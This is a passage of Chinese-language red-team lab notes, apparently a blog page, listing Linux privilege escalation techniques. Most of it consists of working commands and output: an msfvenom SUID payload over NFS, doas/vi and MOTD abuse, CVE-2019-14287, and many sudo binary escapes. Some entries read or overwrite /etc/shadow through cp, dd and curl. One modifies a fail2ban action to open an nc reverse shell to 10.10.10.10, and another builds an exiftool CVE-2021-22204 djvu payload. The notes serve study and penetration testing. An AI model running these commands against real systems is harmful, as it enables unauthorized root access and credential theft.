挂载</span><br>┌──(root㉿kali)-[/home/kali/Musics/PrivEscaLabs]<br>└─<span class="hljs-comment"># mkdir /tmp/nfs</span><br>┌──(root㉿kali)-[/home/kali/Musics/PrivEscaLabs]<br>└─<span class="hljs-comment"># mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs</span><br>Created symlink /run/systemd/system/remote-fs.target.wants/rpcstatd.<br>service → /lib/systemd/system/rpc-statd.service.<br>┌──(root㉿kali)-[/home/kali/Musics/PrivEscaLabs]<br>└─<span class="hljs-comment"># cd /tmp/nfs</span><br><br><span class="hljs-comment"># 生成root属主的可执行文件写入到共享目录中</span><br>┌──(root㉿kali)-[/tmp/nfs]<br>└─<span class="hljs-comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o</span><br>/tmp/nfs/shell.elf<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from<br>the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 48 bytes<br>Final size of elf file: 132 bytes<br>Saved as: /tmp/nfs/shell.elf<br><br><span class="hljs-comment"># 增加运行权限</span><br>┌──(root㉿kali)-[/tmp/nfs]<br>└─<span class="hljs-comment"># chmod +xs shell.elf</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="内核利用提权"><a href="#内核利用提权" class="headerlink" title="内核利用提权"></a>内核利用提权</h3><p>内核漏洞利用方法很简单：1.确定内核版本，2.为目标系统的内核版本搜索并找到一个漏洞利用代码。3.运行漏洞利用</p>
+<p>可以直接使用已编译的漏洞利用，如 Binary Exploits( <a target="_blank" rel="noopener" href="https://gitlab.com/exploitdatabase/exploitdb-bin-sploits">https://gitlab.com/exploitdatabase/exploitdb-bin-sploits</a> )上就有比较全的内核漏洞编译文件，或可节约编译的探索时间，但的确有一定几率不成功，需要重新编译，甚至本地编译。Linux Kernel CVEs( <a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/">https://www.linuxkernelcves.com</a> )是一个直观的内核 CVE 检索目录。</p>
+<h3 id="doas-less-vi-提权"><a href="#doas-less-vi-提权" class="headerlink" title="doas less+vi 提权"></a>doas less+vi 提权</h3><p>用 <code>find / -perm -u=s -type f 2&gt;/dev/null</code> 发现有 <code>/usr/bin/doas</code> 可执行文件。根据 doas 的用法，查看其配置文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">RedteamNotes$ <span class="hljs-built_in">cat</span> /etc/doas.conf<br>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog<br>permit nopass keepenv root as root<br></code></pre></td></tr></table></figure>
+
+<p>执行上述命令，在 less 界面按 v 键启动 vi 编辑状态。按照 vi 启动 shell 的命令语法，在 vi 中执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:!sh<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用-MOTD-机制提权"><a href="#利用-MOTD-机制提权" class="headerlink" title="利用 MOTD 机制提权"></a>利用 MOTD 机制提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 枚举</span><br><span class="hljs-built_in">ls</span> -al /etc/update-motd.d/<br><br><span class="hljs-comment"># 利用</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /home/RedteamNotes/bash &amp;&amp; chmod u+s /home/RedteamNotes/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure>
+
+<h3 id="可预测-PRNG-暴力破解-SSH-提权"><a href="#可预测-PRNG-暴力破解-SSH-提权" class="headerlink" title="可预测 PRNG 暴力破解 SSH 提权"></a>可预测 PRNG 暴力破解 SSH 提权</h3><p>在 OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 的 debian 及衍生版本中有可预测伪随机谁生成机制的 SSH 暴力破解利用</p>
+<p>5622.txt 中介绍了使用方法。</p>
+<ol>
+<li>下载 <a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/binsploits/5622.tar.bz2">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/binsploits/5622.tar.bz2</a> 密钥对包</li>
+<li>解压后，用 grep -lr 在其中搜索你枚举或搜索到的公钥中前 20-30 个字符。找到后，取用对应的私钥，完成 ssh 的登录。</li>
+</ol>
+<h3 id="sudo-风暴"><a href="#sudo-风暴" class="headerlink" title="sudo 风暴"></a>sudo 风暴</h3><h4 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换用户</span><br>sudo -u jack<br><br><span class="hljs-comment"># 前提1</span><br>(ALL, !root) NOPASSWD: /bin/bash<br><br><span class="hljs-comment"># 前提2</span><br><span class="hljs-comment"># CVE-2019-14287影响的是1.8.28及其之前的sudo版本。这个漏洞在1.8.28p1版本中被修复。</span><br><br><span class="hljs-comment"># -1会被解释为0</span><br>sudo -u<span class="hljs-comment">#-1 /bin/bash</span><br><br><span class="hljs-comment"># 可以查看sudo的版本</span><br>sudo -V | grep version <br></code></pre></td></tr></table></figure>
+
+<h3 id="sudo-apt"><a href="#sudo-apt" class="headerlink" title="sudo apt"></a>sudo apt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash<br>Failed to start apt-news.service: Transport endpoint is not connected<br>See system logs and <span class="hljs-string">&#x27;systemctl status apt-news.service&#x27;</span> <span class="hljs-keyword">for</span> details.<br>Failed to start esm-cache.service: Transport endpoint is not connected<br>See system logs and <span class="hljs-string">&#x27;systemctl status esm-cache.service&#x27;</span> <span class="hljs-keyword">for</span> details.<br>root@RedteamNotes:/tmp<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><code>-o APT::Update::Pre-Invoke::=/bin/bash</code>：这是一个 apt 命令的选项，用于设置在运行 apt update 之前执行的预处理脚本。::类似于名字空间，逐级访问子配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 另外两种利用方法，取决于版本等环境因素。apt-get用法与此相同</span><br><span class="hljs-comment"># 1</span><br>sudo apt changelog apt<br>!/bin/sh<br><br><span class="hljs-comment"># 2</span><br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>sudo apt install -c <span class="hljs-variable">$TF</span> sl<br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用此选项加载 /etc/shadow 文件，将产生一条错误信息</span><br>user@RedteamNotes:~$ sudo apache2 -f /etc/shadow<br>Syntax error on line 1 of /etc/shadow:<br>Invalid <span class="hljs-built_in">command</span><br><span class="hljs-string">&#x27;root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.</span><br><span class="hljs-string">jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::&#x27;</span>, perhaps misspelled or defined by a<br>module not included <span class="hljs-keyword">in</span> the server configuration<br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-ash"><a href="#sudo-ash" class="headerlink" title="sudo ash"></a>sudo ash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo /usr/bin/ash<br><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<p>ash 是 Bourne shell（sh）的一个轻量级版本，它消耗的系统资源更少，通常用于嵌入式系统和资源有限的环境。</p>
+<h4 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo /usr/bin/awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><code>&#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>是 awk 的语法，是传递给 awk 的脚本。BEGIN 是 awk 的一个特殊模式，表示在处理任何输入行之前执行的动作。在这个脚本中，BEGIN 块中的唯一动作是调用 system 函数。system 函数用于在 awk 内部执行 shell 命令，这里的命令是 &#x2F;bin&#x2F;bash，也就是启动一个新的 bash shell</p>
+<h4 id="sudo-base64"><a href="#sudo-base64" class="headerlink" title="sudo base64"></a>sudo base64</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ RedteamNotes=/etc/shadow<br>jackie@RedteamNotes:~$ sudo <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$RedteamNotes</span>&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure>
+
+<p>base32 、 base58、basenc、basez 等可以用同的方法</p>
+<h4 id="sudo-bash"><a href="#sudo-bash" class="headerlink" title="sudo bash"></a>sudo bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><code>ash、csh、dash、sh、tclsh、zsh</code> 都是常用的 bash</p>
+<h4 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a>sudo cp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$ mkpasswd -m sha-512 123456<br>$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCjCwYSZzXaAfwDSyS3OKx8uBcUQSs/<br><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$<br>root:$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCjCwYSZzXaAfwDSyS3OKx8uBcUQSs/:19495:0:99999:7:::<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ RedteamNotes=/etc/shadow<br>jackie@RedteamNotes:~$ TF=$(<span class="hljs-built_in">mktemp</span>)<br>jackie@RedteamNotes:~$ <span class="hljs-built_in">echo</span><br><span class="hljs-string">&#x27;root:$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCjCwYSZzXaAfwDSyS3OKx8uBcUQSs/:19495:0:99999:7:::&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>jackie@RedteamNotes:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span><br>/tmp/tmp.bpJlJC5XIv<br>jackie@RedteamNotes:~$ <span class="hljs-built_in">cat</span> /tmp/tmp.bpJlJC5XIv<br>root:$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCj<br>CwYSZzXaAfwDSyS3OKx8uBcUQSs/:19495:0:99999:7:::<br>jackie@RedteamNotes:~$ sudo /usr/bin/cp <span class="hljs-variable">$TF</span> <span class="hljs-variable">$RedteamNotes</span><br></code></pre></td></tr></table></figure>
+
+<p>TF&#x3D;$(mktemp)做临时文件赋值给 TF，这种做临时文件的方式是专业的做法，是最佳实践，还是从安全和便捷角度考虑的。TF 是 Temp File，也可以根据需要自主命名。</p>
+<h4 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a>sudo cpulimit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo cpulimit -l 100 -f /bin/bash<br>Process 3082 detected<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>sudo cpulimit -l 100 -f &#x2F;bin&#x2F;sh 这个命令的目的是以超级用户权限限制 &#x2F;bin&#x2F;sh 命令的 CPU 使用率不超过 100%。</p>
+<h4 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a>sudo curl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 本地生成哈希密码</span><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$ mkpasswd -m sha-512 123456<br>$6$owj08NcJSU1z7CMp<span class="hljs-variable">$17Lc7yTSV27fe</span>/fwG.kShdwk02MkgvgwSfWZDG3iRJMQNBsG6pPtJQWJ3iaPes5WdrRl1ZFI4CRL.IEtfCD.y1<br><br><span class="hljs-comment"># 使用curl命令获取文件，并覆盖shadow文件</span><br>jackie@RedteamNotes:~$ sudo curl http://10.10.10.10/shadow_bespoke -o /etc/shadow<br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a>sudo date</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -f 参数允许 date 从给定的文件中读取日期和时间。这个文件应包含一行或多行日期和时间信息。虽然报错/etc/shadow 文件却被显示出来。</span><br>jackie@RedteamNotes:~$ sudo <span class="hljs-built_in">date</span> -f /etc/shadow<br><span class="hljs-built_in">date</span>: invalid <span class="hljs-built_in">date</span><br>‘root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::’<br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-dd"><a href="#sudo-dd" class="headerlink" title="sudo dd"></a>sudo dd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$owj08NcJSU1z7CMp$17Lc7yTSV27fe/fwG.kShdwk02MkgvgwSfWZDG3iRJMQNBsG6pPtJQWJ3iaPes5WdrRl1ZFI4CRL.IEtfCD.y1:17298:0:99999:7:::&#x27;</span> | sudo <span class="hljs-built_in">dd</span> of=/etc/shadow<br><br></code></pre></td></tr></table></figure>
+
+<p>dd 是一个命令行工具，常用在 Unix 和 Linux 系统中，用于对原始数据进行低级别的复制和转换。它非常灵活，可以用于许多任务，如复制数据、转换数据的编码、生成文件等。if 是输入，of 是输出。</p>
+<h4 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a>sudo dstat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ find / -name dstat -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>/usr/share/doc/dstat<br>/usr/share/dstat<br><br><span class="hljs-comment"># 插件写入python文件</span><br>jackie@RedteamNotes:/usr/share/dstat$ <span class="hljs-built_in">cat</span> dstat_exploit.py<br>import os; os.execv(<span class="hljs-string">&quot;/bin/bash&quot;</span>, [<span class="hljs-string">&quot;bash&quot;</span>])<br><br><span class="hljs-comment"># 加载构造好的恶意插件</span><br>jackie@RedteamNotes:/usr/share/dstat$ sudo dstat --exploit<br>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated <span class="hljs-keyword">in</span> favour of importlib and slated <span class="hljs-keyword">for</span> removal <span class="hljs-keyword">in</span> Python 3.12; see the module\<span class="hljs-string">&#x27;s documentation</span><br><span class="hljs-string">for alternative uses</span><br><span class="hljs-string">import imp</span><br><span class="hljs-string">root@RedteamNotes:/usr/share/dstat#</span><br></code></pre></td></tr></table></figure>
+
+<p>dstat 是一个用于系统监控和诊断的工具，它提供了实时的性能统计数据和系统资源使用情况。通过使用 dstat 命令，您可以获得关于 CPU、内存、磁盘、网络等方面的详细信息。</p>
+<h4 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a>sudo ed</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo ed<br>!/bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>ed 是一个编辑器，一个基于行的文本编辑器，它被设计成在终端中进行操作</p>
+<h4 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo <span class="hljs-built_in">env</span> /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>env 通常用于设置和显示环境变量的值</p>
+<h4 id="sudo-exiftool"><a href="#sudo-exiftool" class="headerlink" title="sudo exiftool"></a>sudo exiftool</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">stux@ubuntu:~$ exiftool -ver<br>12.05<br><span class="hljs-comment"># CVE-2021-22204，exiftool的12.05可以存在漏洞。一般认为exiftool 7.44-12.23都可能存在漏洞</span><br><br>stux@ubuntu:~$ vi payload<br>stux@ubuntu:~$ <span class="hljs-built_in">cat</span> payload<br>(metadata <span class="hljs-string">&quot;\c<span class="hljs-variable">$&#123;system(&#x27;/bin/bash&#x27;)&#125;</span>;&quot;</span>)<br>stux@ubuntu:~$ bzz payload payload.bzz<br>stux@ubuntu:~$ djvumake exploit.djvu INFO=<span class="hljs-string">&#x27;1,1&#x27;</span> BGjp=/dev/null ANTz=payload.bzz<br>stux@ubuntu:~$ sudo exiftool exploit.djvu<br>root@ubuntu:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>BZZ 是一种文件压缩格式，它提供了高压缩比和快速解压缩速度。BZZ 文件通常具有较小的文件大小，可以节省存储空间，并且在解压缩时不会对文件的完整性产生影响。</p>
+<p>DjVuMake 是用于创建和转换 DjVu 文件的工具。DjVu 是一种图像压缩文件格式，主要用于扫描文档和电子书。与其他图像格式相比，DjVu 可以提供更高的压缩比，同时保持较好的图像质量。DjVuMake 工具可以将图像、文本和其他数据转换为 DjVu 格式，并且可以进行一些优化和配置，以满足特定需求。DjVu 文件通常用于在网络上共享大型扫描文档，以便更快地加载和浏览。</p>
+<h4 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a>sudo expect</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo expect -c <span class="hljs-string">&#x27;spawn /bin/bash;interact&#x27;</span><br>spawn /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>expect 能够模拟用户的键盘输入（例如，密码和其他响应），因此可以自动化需要用户交互的过程。它主要用于脚本和其他自动化环境中。</p>
+<p>整个命令 <code>sudo expect -c &#39;spawn /bin/bash;interact&#39;</code> 将以 root 用户的身份在新的 shell 进程中开启一个交互式会话。-c 允许你直接在命令行中输入 expect 脚本代码，而不是从文件中读取。</p>
+<h4 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a>sudo fail2ban</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找fail2ban的配置文件</span><br>jackie@RedteamNotes:/etc/fail2ban$ find / -name <span class="hljs-string">&quot;fail2ban*&quot;</span> -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>/usr/share/doc/fail2ban<br>/usr/lib/python3/dist-packages/fail2ban-0.11.2.egg-info<br>/usr/lib/python3/dist-packages/fail2ban<br>/run/fail2ban<br>/var/lib/fail2ban<br>/etc/fail2ban<br>/etc/fail2ban/fail2ban.d<br><br><span class="hljs-comment"># 查看fail2ban的规则文件文件夹是否可写。</span><br>jackie@RedteamNotes:~$ find /etc -writable -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>/etc/fail2ban/action.d<br><br><span class="hljs-comment"># 查看配置文件权限</span><br>jackie@RedteamNotes:/etc/fail2ban$ <span class="hljs-built_in">ls</span> -liah jail.conf<br>442894 -rw-r--r-- 1 root root 25K May 22 09:27 jail.conf<br><br><span class="hljs-comment"># 虽然文件不可写，但文件夹是可写的，因此我们可以将文件重命名，然后复制成当前用户权限的文件</span><br>jackie@RedteamNotes:/etc/fail2ban/action.d$ <span class="hljs-built_in">mv</span> iptables-multiport.conf iptablesmultiport.conf.bak<br>jackie@RedteamNotes:/etc/fail2ban/action.d$ <span class="hljs-built_in">cp</span> iptables-multiport.conf.bak iptables-multiport.conf<br></code></pre></td></tr></table></figure>
+
+<p>mv 是移动文件，属主不变，cp 是创建文件属主会是操作者的数组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 加入反弹shell的逻辑</span><br>jackie@RedteamNotes:/etc/fail2ban/action.d$ vim iptables-multiport.conf<br>jackie@RedteamNotes:/etc/fail2ban/action.d$ <span class="hljs-built_in">cat</span> iptables-multiport.conf | grep<br>actionban<br><span class="hljs-comment"># Notes.: command executed once before each actionban command</span><br><span class="hljs-comment"># Option: actionban</span><br><span class="hljs-comment"># actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;</span><br>actionban = <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.10 9595 &gt;/tmp/f<br><br><span class="hljs-comment"># 重启fail2ban</span><br>jackie@RedteamNotes:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart<br>Restarting fail2ban (via systemctl): fail2ban.service.<br><br><span class="hljs-comment"># 快速尝试错误密码，进而触发action，从而实现反弹shell</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo find . -<span class="hljs-built_in">exec</span> /bin/bash \; -quit<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><code>\;</code> 则是 <code>-exec</code> 参数的结束符，告诉 <code>find</code> 命令 <code>-exec</code> 参数的内容到此为止。需要注意的是，<code>-exec</code> 命令后面的 <code>\;</code> 必须被转义（即加上 <code>\</code>），否则 shell 会将 <code>;</code> 解释为命令分隔符，这会导致 <code>-exec</code> 参数没有正确的结束，从而引发错误。因此我们需要写成 <code>\;</code>，而不是单独的 <code>;</code>。</p>
+<h4 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a>sudo flock</h4><p><code>flock</code> : 这是一个在 Linux 中管理文件锁定的实用程序。它可以用来协调多个进程对文件或文件系统的访问，避免这些进程同时访问同一资源导致的问题。<code>-u</code> : 这是一个flock的选项，表示解锁。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo flock -u / /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a>sudo ftp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo ftp<br>ftp&gt; !/bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>! 在这里是一个特殊的字符，表示要暂时离开 FTP 会话并在本地 shell 中执行命令。!的这个用法在 vi、ed 等编辑器场景下也存在。可以总结为一种通行做法。</p>
+<h4 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a>sudo gcc</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo gcc -wrapper /bin/bash,-s .<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><code>-wrapper</code>：这是 gcc 的一个选项，它允许你在 gcc 调用实际编译器或链接器之前，先调用一个包装器（wrapper）脚本或程序。</li>
+<li><code>,-s</code>：是 bash 带的一个选项，它使得 bash 在读取到 EOF 时不会退出（通常用于从标准输入读取命令）</li>
+<li>最后那个.就是编译的源码，你给他任意源码也行，但因为不想编译任何东西，所以最简略的就是给他很通用的东西——当前目录的全部。</li>
+</ol>
